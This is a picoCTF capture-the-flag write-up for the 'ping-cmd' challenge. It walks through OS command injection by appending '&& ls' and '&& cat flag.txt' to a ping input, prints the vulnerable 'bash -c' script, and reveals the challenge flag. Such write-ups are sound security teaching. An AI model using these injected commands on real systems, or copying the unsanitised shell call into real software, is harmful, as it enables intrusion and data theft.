# picoCTF — ping-cmd

> **Category:** Web Exploitation / Command Injection
> **Challenge:** ping-cmd
> **Platform:** picoCTF

## Challenge Description

> Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?
>
> Connect to the service:
>
> ```bash
> nc mysterious-sea.picoctf.net 52029
> ```

---

## 1. Connect to the Service

I connected to the challenge using `netcat`:

```bash
nc mysterious-sea.picoctf.net 52029
```

The server prompted:

```text
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):
```

Entering the expected IP address:

```text
8.8.8.8
```

resulted in:

```text
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=12.7 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=12.7 ms
```

At first glance, it appears that the server only allows `8.8.8.8`.

But the challenge description hints that we should get **creative with the input**.

---

## 2. Test for Command Injection

A common way to execute another command after a shell command is with:

```text
&&
```

So instead of entering only:

```text
8.8.8.8
```

I tried:

```text
8.8.8.8 && ls
```

The server returned the normal ping output, followed by:

```text
--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 12.684/12.700/12.716/0.016 ms
flag.txt
script.sh
```

This confirmed that **command injection is possible**.

The `ls` command executed successfully on the remote server.

---

## 3. Inspect the Server Files

The directory contained:

```text
flag.txt
script.sh
```

Since `script.sh` looked interesting, I decided to read it along with the flag:

```text
8.8.8.8 && cat script.sh && cat flag.txt
```

The server returned:

```text
--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 12.718/12.726/12.734/0.008 ms

#!/bin/bash
echo -n "Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): "
read domain
bash -c "ping -c2 $domain"

picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_ddce97d3}
```

The flag was successfully retrieved.

---

## 4. Why the Exploit Works

The vulnerable script contains:

```bash
read domain
bash -c "ping -c2 $domain"
```

The user's input is stored in the variable:

```bash
domain
```

and then directly inserted into another shell command:

```bash
bash -c "ping -c2 $domain"
```

There is **no proper validation or sanitization** of the input.

Therefore, when we submit:

```text
8.8.8.8 && ls
```

the resulting command effectively becomes:

```bash
ping -c2 8.8.8.8 && ls
```

The shell interprets `&&` as a command separator.

So it executes:

1. `ping -c2 8.8.8.8`
2. If the ping succeeds, execute `ls`

That's why the directory listing appeared after the ping output.

---

## 5. Retrieve the Flag

Once command injection was confirmed, we could simply execute:

```bash
cat flag.txt
```

by injecting it after the valid IP:

```text
8.8.8.8 && cat flag.txt
```

Or, as I did, inspect both files:

```text
8.8.8.8 && cat script.sh && cat flag.txt
```

This revealed the flag.

---

## Exploit Summary

The vulnerable input:

```text
8.8.8.8
```

is transformed into:

```bash
bash -c "ping -c2 8.8.8.8"
```

But because the input isn't sanitized, we can inject additional shell commands.

For example:

```text
8.8.8.8 && ls
```

becomes effectively:

```bash
bash -c "ping -c2 8.8.8.8 && ls"
```

And:

```text
8.8.8.8 && cat flag.txt
```

becomes:

```bash
bash -c "ping -c2 8.8.8.8 && cat flag.txt"
```

The server therefore executes our injected command.

---

## Complete Solution

Connect:

```bash
nc mysterious-sea.picoctf.net 52029
```

Test command injection:

```text
8.8.8.8 && ls
```

Then retrieve the flag:

```text
8.8.8.8 && cat flag.txt
```

Alternatively, inspect the script and flag together:

```text
8.8.8.8 && cat script.sh && cat flag.txt
```

---

## Flag

```text
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_ddce97d3}
```

## Key Takeaway

The challenge demonstrates a basic **OS command injection** vulnerability.

The application claims:

> only allow `8.8.8.8`

but never actually enforces that restriction. Instead, it passes the raw user input directly into:

```bash
bash -c "ping -c2 $domain"
```

Whenever untrusted input is inserted into a shell command without proper validation or escaping, shell metacharacters such as:

```text
&&
;
|
```

can potentially be used to execute unintended commands.

### Flag

🏁 **`picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_ddce97d3}`**
